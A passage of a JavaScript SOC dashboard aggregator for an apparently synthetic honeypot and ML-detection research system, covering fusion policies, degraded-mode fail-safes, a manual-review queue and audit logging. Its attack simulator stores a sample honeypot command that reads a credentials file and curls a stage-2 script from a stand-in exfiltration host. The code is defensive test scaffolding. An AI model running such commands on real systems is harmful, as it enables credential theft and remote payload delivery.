     * telemetry snapshot generated from the held-out 384-flow test_set.
     */
    _loadTriModelTelemetry() {
        const candidatePaths = [
            path.resolve(__dirname, '../data/tri_model_dashboard_telemetry_v2.json'),
            path.resolve(__dirname, 'data/tri_model_dashboard_telemetry_v2.json')
        ];
        let rawData = null;
        for (const p of candidatePaths) {
            if (fs.existsSync(p)) {
                rawData = JSON.parse(fs.readFileSync(p, 'utf8'));
                break;
            }
        }
        if (!rawData) {
            throw new Error('Missing tri_model_dashboard_telemetry_v2.json artifact for Stage 4 SOC Dashboard');
        }
        this.triModelBundle = rawData;
        this.triModelOverview = JSON.parse(JSON.stringify(rawData.tri_model_overview));
        this.triModelDetections = JSON.parse(JSON.stringify(rawData.detections || []));
        this.manualReviewQueue = JSON.parse(JSON.stringify(rawData.manual_review_queue || []));
        this.evaluationViews = JSON.parse(JSON.stringify(rawData.evaluation_views || {}));
        this.researchBenchmark = JSON.parse(JSON.stringify(rawData.research_benchmark || {}));

        // Load Stage 5 Cohort E Comparative Benchmark & Separated SOAR Evaluation if present
        const cohortEPaths = [
            path.resolve(__dirname, '../evaluation/results/cohort_e_benchmark_results.json'),
            path.resolve(__dirname, '../data/cohort_e_benchmark_results.json')
        ];
        for (const cp of cohortEPaths) {
            if (fs.existsSync(cp)) {
                try {
                    const cohortEData = JSON.parse(fs.readFileSync(cp, 'utf8'));
                    this.researchBenchmark.cohort_e_extension = {
                        benchmark_classification: 'SYNTHETIC BENCHMARK ONLY',
                        scientific_disclaimer: cohortEData.scientific_disclaimer,
                        experimental_conditions: cohortEData.experimental_conditions,
                        track1_system_cohorts_a_to_e: cohortEData.track1_system_cohorts_a_to_e,
                        track2_flow_ml_and_tri_model_ablation: cohortEData.track2_flow_ml_and_tri_model_ablation,
                        track3_detection_vs_soar_separation: cohortEData.track3_detection_vs_soar_separation
                    };
                } catch (_) {
                    // Ignore parse error in fallback mode
                }
                break;
            }
        }
    }

    /**
     * Recursively strip internal filesystem paths and secrets so VIEWER and external
     * consumers never receive host file paths or sensitive credentials.
     */
    sanitizeForRole(input, userRole = 'VIEWER') {
        if (input === null || input === undefined) return input;
        if (Array.isArray(input)) {
            return input.map(item => this.sanitizeForRole(item, userRole));
        }
        if (typeof input === 'object') {
            const out = {};
            for (const [k, v] of Object.entries(input)) {
                if (SENSITIVE_PATH_KEYS.has(k)) {
                    continue;
                }
                if (userRole === 'VIEWER' && (k === 'internal_model_dir' || k === 'checkpoint_file_path')) {
                    continue;
                }
                out[k] = this.sanitizeForRole(v, userRole);
            }
            return out;
        }
        if (typeof input === 'string') {
            // Redact accidental Windows/Linux absolute filesystem paths
            return input
                .replace(/[A-Za-z]:\\[^\s"']+/g, '[REDACTED_PATH]')
                .replace(/\/app\/models\/[^\s"']+/g, '[REDACTED_MODEL_PATH]');
        }
        return input;
    }

    /**
     * Simulate an end-to-end multi-stage attack injection across Honeypots, Suricata,
     * Attacker Profiling, Event Correlation, Attack Chain Reconstruction, and SOAR
     */
    simulateMultiStageAttack(scenario = 'ssh_compromise') {
        const nowIso = new Date().toISOString();
        const simIp = scenario === 'smb_lateral' ? '45.33.32.156' : '198.51.100.77';
        const incId = `inc-sim-${crypto.randomUUID().slice(0, 6)}`;

        const hpEvent = {
            event_id: `urn:uuid:${crypto.randomUUID()}`,
            timestamp: nowIso,
            honeypot_id: scenario === 'smb_lateral' ? 'opencanary-multi-01' : 'cowrie-ssh-01',
            honeypot_type: scenario === 'smb_lateral' ? 'opencanary' : 'cowrie',
            source_ip: simIp,
            targeted_service: scenario === 'smb_lateral' ? 'SMB (Port 445)' : 'SSH (Port 2222)',
            event_type: scenario === 'smb_lateral' ? 'OPEN_CANARY_SMB_PROBE' : 'HONEYPOT_COMMAND_EXECUTION',
            severity: 'CRITICAL',
            username_attempted: 'devops',
            auth_outcome: 'SUCCESS',
            command_executed: scenario === 'smb_lateral'
                ? 'SMB TreeConnect \\\\DECOY-CORP\\IT_Vault_Backups'
                : 'id && cat /etc/db_credentials_canary.conf && curl -s http://exfil-tunnel.darknet.example/stage2.sh',
            file_sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
            session_id: `sim-sess-${Date.now().toString().slice(-4)}`
        };
        this.honeypotEvents.unshift(hpEvent);

        const newIncident = {
            incident_id: incId,
            title: `[CORR-02] Simulated Multi-Stage Deception Intrusion from ${simIp}`,
            source_ip: simIp,
            severity: 'CRITICAL',
            confidence: 0.98,
            status: 'OPEN',
            first_seen: nowIso,
            last_seen: nowIso,
            event_count: 5,
            sources_involved: ['suricata-event-collector-service', 'honeypot-event-collector-service', 'threat-intelligence-service'],
            attack_categories: ['SURICATA_SCAN', hpEvent.event_type, 'DATA_EXFILTRATION'],
            targeted_services: [hpEvent.targeted_service],
            matched_rules: [
                { rule_id: 'CORR-01', name: 'Reconnaissance-to-Deception Progression', severity: 'HIGH', confidence: 0.94 },
                { rule_id: 'CORR-02', name: 'Credential Brute-Force to Interactive Shell Compromise', severity: 'CRITICAL', confidence: 0.99 }
            ],
            correlation_summary: `Live simulated multi-stage attack from ${simIp}: correlated Suricata SYN scan with interactive ${hpEvent.honeypot_id} decoy session and honey-breadcrumb access.`,
            recommended_action: {
                action: 'ISOLATE_AND_BLOCK_IP',
                lease_minutes: 60,
                deploy_additional_decoys: true,
                rationale: 'Interactive decoy compromise and honey-credential access confirmed.'
            }
        };
        this.incidents.unshift(newIncident);

        const newChain = {
            chain_id: `chain-sim-${crypto.randomUUID().slice(0, 6)}`,
            incident_id: incId,
            source_ip: simIp,
            severity: 'CRITICAL',
            overall_confidence: 0.98,
            kill_chain_depth: 4,
            certainty_breakdown: { OBSERVED: 3, INFERRED: 1, SUSPECTED: 0 },
            analyst_summary: `Reconstructed 4-stage kill chain for simulated intrusion ${incId} from ${simIp}.`,
            stages: [
                {
                    stage_order: 1,
                    tactic_id: 'TA0043',
                    tactic_name: 'Reconnaissance',
                    technique_id: 'T1595',
                    technique_name: 'Active Port Scanning',
                    certainty_tier: 'OBSERVED',
                    confidence: 0.95,
                    evidence_event_ids: [hpEvent.event_id],
                    telemetry_sources: ['suricata-event-collector-service'],
                    affected_services: [hpEvent.targeted_service],
                    rationale: 'Suricata NIDS alert on initial port sweep.'
                },
                {
                    stage_order: 3,
                    tactic_id: 'TA0006',
                    tactic_name: 'Credential Access',
                    technique_id: 'T1110',
                    technique_name: 'Brute Force & Decoy Login',
                    certainty_tier: 'OBSERVED',
                    confidence: 0.99,
                    evidence_event_ids: [hpEvent.event_id],
                    telemetry_sources: ['honeypot-event-collector-service'],
                    affected_services: [hpEvent.targeted_service],
                    rationale: `Authenticated as '${hpEvent.username_attempted}' on ${hpEvent.honeypot_id}.`
                },
                {
                    stage_order: 5,
                    tactic_id: 'TA0002',
                    tactic_name: 'Execution',
                    technique_id: 'T1059',
                    technique_name: 'Interactive Decoy Command Execution',
                    certainty_tier: 'OBSERVED',
                    confidence: 1.00,
                    evidence_event_ids: [hpEvent.event_id],
                    telemetry_sources: ['honeypot-event-collector-service'],
                    affected_services: [hpEvent.targeted_service],
                    rationale: `Executed: ${hpEvent.command_executed}`
                },
                {
                    stage_order: 7,
                    tactic_id: 'TA0010',
                    tactic_name: 'Exfiltration',
                    technique_id: 'T1041',
                    technique_name: 'Attempted Honey-Credential Exfiltration',
                    certainty_tier: 'INFERRED',
                    confidence: 0.87,
                    evidence_event_ids: [hpEvent.event_id],
                    telemetry_sources: ['ml-detection-service'],
                    affected_services: ['Egress Filter'],
                    rationale: 'ML flow classifier flagged outbound honey-token transfer attempt.'
                }
            ],
            recommended_mitigations: [
                `Enforce 60-minute SOAR block lease on ${simIp}.`,
                'Rotate decoy breadcrumbs and monitor for secondary C2 callbacks.'
            ]
        };
        this.attackChains.unshift(newChain);

        // Add timed block lease
        const blockLease = {
            execution_id: `exec-sim-${crypto.randomUUID().slice(0, 6)}`,
            ip: simIp,
            block_type: 'TEMPORARY_LEASE',
            lease_minutes: 60,
            playbook_id: 'PB-SOAR-01',
            blocked_at: nowIso,
            expires_at: new Date(Date.now() + 60 * 60000).toISOString(),
            status: 'ACTIVE_BLOCKED',
            reason: `Auto-contained simulated multi-stage intrusion (${incId})`
        };
        this.soarBlockLeases.unshift(blockLease);

        return {
            honeypot_event: hpEvent,
            incident: newIncident,
            attack_chain: newChain,
            soar_block: blockLease
        };
    }

    // =========================================================================
    // STAGE 4: AUTOENCODER & TRI-MODEL DETECTION ENGINE SOC INTEGRATION
    // =========================================================================

    /**
     * Return Tri-Model Detection Overview (Model Health, Configured P97 Threshold,
     * Active Fusion Policy, Degraded Indicators, Severity Distribution & Timeline)
     */
    getTriModelOverview(userRole = 'VIEWER') {
        const overview = JSON.parse(JSON.stringify(this.triModelOverview));
        overview.active_fusion_policy = this.activeFusionPolicy;

        // Apply any active degraded-mode state to individual model health cards
        const degModels = new Set(this.degradedOverride.degraded_models || []);
        for (const modelKey of ['random_forest', 'isolation_forest', 'autoencoder']) {
            if (overview.models_health && overview.models_health[modelKey]) {
                if (degModels.has(modelKey)) {
                    overview.models_health[modelKey].status = 'degraded';
                    overview.models_health[modelKey].available = false;
                    overview.models_health[modelKey].degraded_reason =
                        this.degradedOverride.reason || 'model_unavailable';
                } else {
                    overview.models_health[modelKey].status = 'healthy';
                    overview.models_health[modelKey].available = true;
                }
            }
        }

        overview.engine_status = this.degradedOverride.status;
        overview.degraded_state = {
            ...overview.degraded_state,
            is_degraded: this.degradedOverride.is_degraded,
            status: this.degradedOverride.status,
            degraded_models: [...degModels],
            active_warnings: [...(this.degradedOverride.active_warnings || [])]
        };

        overview.manual_review_summary = {
            total_items: this.manualReviewQueue.length,
            pending_count: this.manualReviewQueue.filter(i => i.review_status === 'PENDING_ANALYST_REVIEW').length,
            ae_only_count: this.manualReviewQueue.filter(i => i.is_autoencoder_only).length,
            if_only_count: this.manualReviewQueue.filter(i => !i.is_autoencoder_only).length,
            audit_log_count: this.manualReviewAuditLog.length
        };

        return this.sanitizeForRole(overview, userRole);
    }

    /**
     * Return Explainable Tri-Model Flow Detections with optional policy projection & filtering
     */
    getTriModelDetections(options = {}, userRole = 'VIEWER') {
        const activePolicy = options.policy || this.activeFusionPolicy || 'weighted_consensus';
        const filterDecision = options.decision ? String(options.decision).toLowerCase() : null;
        const filterAgreement = options.agreement ? String(options.agreement).toUpperCase() : null;
        const limit = Number(options.limit || 60);

        const degModels = new Set(this.degradedOverride.degraded_models || []);
        const allThreeDegraded = degModels.size >= 3;
        const partiallyDegraded = degModels.size > 0 && degModels.size < 3;

        let flows = this.triModelDetections.map(rawFlow => {
            const flow = JSON.parse(JSON.stringify(rawFlow));

            // Reflect model status if degraded
            for (const mk of ['random_forest', 'isolation_forest', 'autoencoder']) {
                if (degModels.has(mk) && flow.models[mk]) {
                    flow.models[mk].status = 'degraded';
                }
            }

            // Project selected fusion policy if available in policy_comparison
            const polComp = flow.tri_model_decision.policy_comparison?.[activePolicy];
            if (polComp && !allThreeDegraded) {
                flow.tri_model_decision.fusion_policy = activePolicy;
                flow.tri_model_decision.final_decision = polComp.final_decision;
                flow.tri_model_decision.is_anomaly = polComp.is_anomaly;
                flow.tri_model_decision.recommended_action = polComp.recommended_action;
                flow.tri_model_decision.decision_rule = polComp.decision_rule;
            }

            // Enforce degraded-mode guardrails
            if (allThreeDegraded) {
                flow.tri_model_decision.status = 'degraded';
                flow.tri_model_decision.final_decision = 'degraded';
                flow.tri_model_decision.is_anomaly = null;
                flow.tri_model_decision.recommended_action = 'manual-review';
                flow.tri_model_decision.auto_block_permitted = false;
                flow.tri_model_decision.decision_rule = 'ALL_MODELS_DEGRADED_FAILSAFE_MANUAL_REVIEW';
                flow.tri_model_decision.degraded_models = [...degModels];
                flow.tri_model_decision.warnings = [...(this.degradedOverride.active_warnings || [])];
            } else if (partiallyDegraded) {
                flow.tri_model_decision.status = 'partially_degraded';
                flow.tri_model_decision.auto_block_permitted = false;
                if (flow.tri_model_decision.recommended_action === 'block') {
                    flow.tri_model_decision.recommended_action = 'manual-review';
                }
                flow.tri_model_decision.degraded_models = [...degModels];
                flow.tri_model_decision.warnings = [...(this.degradedOverride.active_warnings || [])];
            }

            // Mandatory Safety Rule: AE_ONLY never permits automatic IP blocking
            if (flow.tri_model_decision.agreement_pattern === 'AE_ONLY') {
                flow.tri_model_decision.auto_block_permitted = false;
                if (flow.tri_model_decision.recommended_action === 'block') {
                    flow.tri_model_decision.recommended_action = 'manual-review';
                }
            }

            return flow;
        });

        if (filterDecision) {
            flows = flows.filter(f => String(f.tri_model_decision.final_decision).toLowerCase() === filterDecision);
        }
        if (filterAgreement) {
            flows = flows.filter(f => String(f.tri_model_decision.agreement_pattern).toUpperCase() === filterAgreement);
        }

        return this.sanitizeForRole(
            {
                benchmark_classification: 'SYNTHETIC BENCHMARK ONLY',
                active_fusion_policy: activePolicy,
                engine_status: this.degradedOverride.status,
                degraded_models: [...degModels],
                total_returned: Math.min(flows.length, limit),
                detections: flows.slice(0, limit)
            },
            userRole
        );
    }

    /**
     * Return full explainable investigation dossier for a specific flow_id
     */
    getFlowInvestigationDetails(flowId, userRole = 'VIEWER') {
        const allFlows = [
            ...this.triModelDetections,
            ...(this.evaluationViews.false_positives || []),
            ...(this.evaluationViews.false_negatives || []),
            ...(this.evaluationViews.feature_collisions || [])
        ];
        const found = allFlows.find(f => f.flow_id === flowId);
        if (!found) {
            return null;
        }
        const projected = this.getTriModelDetections({ policy: this.activeFusionPolicy, limit: 500 }, userRole);
        const matchInProjected = projected.detections.find(f => f.flow_id === flowId) || this.sanitizeForRole(found, userRole);

        const reviewItem = this.manualReviewQueue.find(r => r.flow_id === flowId) || null;
        const reviewHistory = this.manualReviewAuditLog.filter(a => a.flow_id === flowId);
        const correlatedIncident = this.incidents.find(
            inc => inc.source_ip === found.src_ip || (inc.title && inc.title.includes(flowId))
        ) || null;

        return this.sanitizeForRole(
            {
                benchmark_classification: 'SYNTHETIC BENCHMARK ONLY',
                flow: matchInProjected,
                explainability_summary: {
                    distinction_note:
                        'Random Forest outputs a calibrated supervised class probability P(attack|x) in [0,1]. ' +
                        'Isolation Forest outputs an unsupervised isolation depth score (raw < 0 = outlier) and monotonic anomaly index. ' +
                        'PyTorch Autoencoder outputs Mean Squared Reconstruction Error (MSE) across 69 scaled features compared against P97=0.503670.',
                    top_contributing_features: matchInProjected.models.autoencoder.top_contributing_features,
                    agreement_pattern: matchInProjected.tri_model_decision.agreement_pattern,
                    models_agreeing_on_anomaly: matchInProjected.tri_model_decision.models_agreeing_on_anomaly,
                    decision_rule: matchInProjected.tri_model_decision.decision_rule,
                    auto_block_permitted: matchInProjected.tri_model_decision.auto_block_permitted,
                    safety_rationale:
                        matchInProjected.tri_model_decision.agreement_pattern === 'AE_ONLY'
                            ? 'Autoencoder-only anomaly: independent automatic IP blocking is strictly forbidden by safety policy.'
                            : matchInProjected.tri_model_decision.auto_block_permitted
                            ? 'Multi-model / high-confidence supervised confirmation permits automated containment.'
                            : 'Routed for alert/monitoring or analyst manual review.'
                },
                manual_review_item: reviewItem,
                manual_review_audit_trail: reviewHistory,
                correlated_incident: correlatedIncident
            },
            userRole
        );
    }

    /**
     * Return False-Positive (FP), False-Negative (FN), and Feature-Collision Evaluation Views
     */
    getEvaluationViews(userRole = 'VIEWER') {
        return this.sanitizeForRole(
            {
                benchmark_classification: 'SYNTHETIC BENCHMARK ONLY',
                ...this.evaluationViews
            },
            userRole
        );
    }

    /**
     * Return Manual-Review Queue for Autoencoder-Only (AE_ONLY) and Single-Detector Outliers
     */
    getManualReviewQueue(userRole = 'VIEWER') {
        return this.sanitizeForRole(
            {
                safety_policy:
                    'Autoencoder-only anomalies (AE_ONLY) never independently authorize automatic IP blocking. ' +
                    'All manual-review decisions require SOC_ANALYST or ADMIN role and are recorded in an immutable audit log.',
                total_queue_items: this.manualReviewQueue.length,
                ae_only_items_count: this.manualReviewQueue.filter(i => i.is_autoencoder_only).length,
                pending_items_count: this.manualReviewQueue.filter(i => i.review_status === 'PENDING_ANALYST_REVIEW').length,
                queue: this.manualReviewQueue,
                audit_log: this.manualReviewAuditLog
            },
            userRole
        );
    }

    /**
     * Execute an auditable SOC Analyst / Admin decision on a Manual-Review Queue item.
     * Enforces the safety rule that an Autoencoder-only anomaly can NEVER execute an
     * independent automatic IP block.
     */
    decideManualReview(flowId, payload = {}) {
        const item = this.manualReviewQueue.find(r => r.flow_id === flowId || r.review_id === flowId);
        if (!item) {
            return { found: false, error: 'Manual review item not found' };
        }

        const requestedDecision = String(payload.decision || '').toUpperCase().trim();
        const operator = payload.operator || 'soc-analyst';
        const role = payload.role || 'SOC_ANALYST';
        const analystNotes = String(payload.analyst_notes || 'Reviewed in SOC Command Center').trim();

        // Mandatory Safety Guardrail: Block any attempt to auto-block an AE_ONLY anomaly
        if (
            item.is_autoencoder_only &&
            (requestedDecision === 'AUTO_BLOCK_IP' ||
                requestedDecision === 'BLOCK_IP' ||
                requestedDecision === 'APPROVE_AUTO_BLOCK')
        ) {
            const blockedAudit = {
                audit_id: `mrev-aud-${crypto.randomUUID().slice(0, 8)}`,
                flow_id: item.flow_id,
                review_id: item.review_id,
                trigger_source: item.trigger_source,
                is_autoencoder_only: true,
                requested_decision: requestedDecision,
                outcome: 'REJECTED_BY_AE_ONLY_SAFETY_POLICY',
                auto_block_executed: false,
                operator,
                role,
                analyst_notes: analystNotes,
                timestamp: new Date().toISOString(),
                reason: 'Safety violation prevented: Autoencoder-only anomalies cannot independently authorize IP blocking.'
            };
            this.manualReviewAuditLog.unshift(blockedAudit);
            return {
                found: true,
                rejected_by_safety_policy: true,
                auto_block_executed: false,
                message:
                    'SAFETY LOCK: Autoencoder-only anomalies (AE_ONLY) are strictly prohibited from authorizing IP blocking without corroborating multi-source evidence.',
                audit_entry: blockedAudit,
                item
            };
        }

        const validDecisions = new Set([
            'DISMISS_FALSE_POSITIVE',
            'ESCALATE_TO_INCIDENT',
            'KEEP_UNDER_OBSERVATION'
        ]);
        const normalizedDecision = validDecisions.has(requestedDecision)
            ? requestedDecision
            : 'KEEP_UNDER_OBSERVATION';

        item.review_status = normalizedDecision;
        item.reviewed_by = operator;
        item.reviewed_role = role;
        item.reviewed_at = new Date().toISOString();
        item.analyst_notes = analystNotes;
        item.auto_block_permitted = false;

        let createdIncident = null;
        if (normalizedDecision === 'ESCALATE_TO_INCIDENT') {
            createdIncident = {
                incident_id: `inc-mrev-${item.flow_id}`,
                title: `[MANUAL-REVIEW ESCALATION] ${item.trigger_source} Anomaly on Flow ${item.flow_id} (${item.src_ip})`,
                source_ip: item.src_ip,
                severity: 'MEDIUM',
                confidence: 0.72,
                status: 'INVESTIGATING',
                first_seen: item.timestamp,
                last_seen: new Date().toISOString(),
                event_count: 1,
                sources_involved: ['ml-detection-service', 'threat-dashboard-service'],
                attack_categories: [item.trigger_source],
                targeted_services: [`${item.protocol} (${item.dst_port})`],
                matched_rules: [
                    {
                        rule_id: 'MREV-AE-01',
                        name: 'Analyst-Escalated Unsupervised Flow Anomaly (Non-Blocking Investigation)',
                        severity: 'MEDIUM',
                        confidence: 0.72
                    }
                ],
                correlation_summary: `SOC Analyst (${operator}) escalated ${item.trigger_source} flow ${item.flow_id} (MSE=${item.ae_reconstruction_error}) for secondary NIDS/Honeypot correlation. Auto-block remains disabled (${analystNotes}).`,
                recommended_action: {
                    action: 'INVESTIGATE_AND_CORRELATE_NO_AUTOBLOCK',
                    lease_minutes: null,
                    deploy_additional_decoys: true,
                    rationale: 'Single-detector unsupervised anomaly escalated for forensic investigation without automatic firewall blocking.'
                }
            };
            this.incidents.unshift(createdIncident);
        }

        const auditEntry = {
            audit_id: `mrev-aud-${crypto.randomUUID().slice(0, 8)}`,
            flow_id: item.flow_id,
            review_id: item.review_id,
            trigger_source: item.trigger_source,
            is_autoencoder_only: item.is_autoencoder_only,
            decision: normalizedDecision,
            outcome: 'RECORDED',
            auto_block_executed: false,
            operator,
            role,
            analyst_notes: analystNotes,
            created_incident_id: createdIncident ? createdIncident.incident_id : null,
            timestamp: item.reviewed_at
        };
        this.manualReviewAuditLog.unshift(auditEntry);

        return {
            found: true,
            rejected_by_safety_policy: false,
            auto_block_executed: false,
            item,
            audit_entry: auditEntry,
            created_incident: createdIncident
        };
    }

    /**
     * Switch active Tri-Model Fusion Policy ('weighted_consensus' | 'unsupervised_ensemble' | 'majority_vote')
     */
    setActiveFusionPolicy(policy, operator = 'soc-analyst') {
        const valid = ['weighted_consensus', 'unsupervised_ensemble', 'majority_vote'];
        if (!valid.includes(policy)) {
            return { success: false, error: `Invalid fusion policy '${policy}'. Must be one of: ${valid.join(', ')}` };
        }
        this.activeFusionPolicy = policy;
        return {
            success: true,
            active_fusion_policy: this.activeFusionPolicy,
            updated_by: operator,
            timestamp: new Date().toISOString()
        };
    }

    /**
     * Configure or clear simulated degraded-model state (ADMIN only) to verify UI & SOAR fail-safe behavior
     */
    setSimulatedDegradedState({ degraded_models = [], reason = 'simulated_model_unavailability', operator = 'admin' } = {}) {
        const validModels = ['random_forest', 'isolation_forest', 'autoencoder'];
        const filtered = Array.isArray(degraded_models)
            ? degraded_models.filter(m => validModels.includes(m))
            : [];

        if (filtered.length === 0) {
            this.degradedOverride = {
                is_degraded: false,
                status: 'healthy',
                degraded_models: [],
                active_warnings: [],
                reason: null,
                updated_by: operator,
                updated_at: new Date().toISOString()
            };
        } else if (filtered.length >= 3) {
            this.degradedOverride = {
                is_degraded: true,
                status: 'degraded',
                degraded_models: filtered,
                active_warnings: [
                    `CRITICAL DEGRADED MODE: All 3 ML models (${filtered.join(', ')}) unavailable (${reason}). All flows routed to manual-review; automatic blocking disabled.`
                ],
                reason,
                updated_by: operator,
                updated_at: new Date().toISOString()
            };
        } else {
            this.degradedOverride = {
                is_degraded: true,
                status: 'partially_degraded',
                degraded_models: filtered,
                active_warnings: [
                    `PARTIALLY DEGRADED MODE: Model(s) [${filtered.join(', ')}] degraded (${reason}). Operating on remaining healthy detectors with automatic IP blocking inhibited.`
                ],
                reason,
                updated_by: operator,
                updated_at: new Date().toISOString()
            };
        }
        return this.getTriModelOverview('ADMIN');
    }

    /**
     * Reload Tri-Model artifacts & reset degraded overrides (ADMIN only)
     */
    reloadTriModelTelemetry(operator = 'admin') {
        this._loadTriModelTelemetry();
        this.degradedOverride = {
            is_degraded: false,
            status: 'healthy',
            degraded_models: [],
            active_warnings: []
        };
        return {
            status: 'reloaded',
            engine_status: 'healthy',
            reloaded_by: operator,
            reloaded_at: new Date().toISOString(),
            models_health: this.getTriModelOverview('ADMIN').models_health
        };
    }

    /**
     * Return 6-Model Synthetic Benchmark & Research Comparison View (`SYNTHETIC BENCHMARK ONLY`)
     */
    getResearchBenchmark(userRole = 'VIEWER') {
        return this.sanitizeForRole(
            {
                benchmark_classification: 'SYNTHETIC BENCHMARK ONLY',
                scientific_disclaimer: this.triModelBundle.scientific_disclaimer,
                ...this.researchBenchmark
            },
            userRole
        );
    }

    getUnifiedSnapshot(userRole = 'VIEWER') {
        const triOverview = this.getTriModelOverview(userRole);
        return {
            timestamp: new Date().toISOString(),
            summary_kpis: {
                active_honeypots: this.honeypots.filter(h => h.status === 'ONLINE').length,
                honeypot_events_24h: this.honeypots.reduce((s, h) => s + h.total_events_24h, 0) + this.honeypotEvents.length,
                tracked_attacker_profiles: this.attackerProfiles.length,
                critical_risk_attackers: this.attackerProfiles.filter(p => p.risk_assessment.threat_level === 'CRITICAL').length,
                open_incidents: this.incidents.filter(i => i.status !== 'CLOSED').length,
                reconstructed_attack_chains: this.attackChains.length,
                active_adaptive_directives: this.adaptiveDirectives.filter(d => d.status === 'ACTIVE').length,
                active_ip_block_leases: this.soarBlockLeases.filter(b => b.status === 'ACTIVE_BLOCKED').length,
                pending_soar_approvals: this.soarPendingApprovals.filter(p => p.status === 'PENDING_APPROVAL').length,
                tri_model_engine_status: triOverview.engine_status,
                pending_ae_manual_reviews: this.manualReviewQueue.filter(
                    r => r.review_status === 'PENDING_ANALYST_REVIEW'
                ).length
            },
            honeypots: this.honeypots,
            honeypot_events: this.honeypotEvents,
            attacker_profiles: this.attackerProfiles,
            incidents: this.incidents,
            attack_chains: this.attackChains,
            threat_intel: this.threatIntelIndicators,
            adaptive_directives: this.adaptiveDirectives,
            soar_block_leases: this.soarBlockLeases,
            soar_pending_approvals: this.soarPendingApprovals,
            allowlist: this.allowlist,
            tri_model_overview: triOverview
        };
    }
}

module.exports = {
    SocCommandCenterAggregator
};
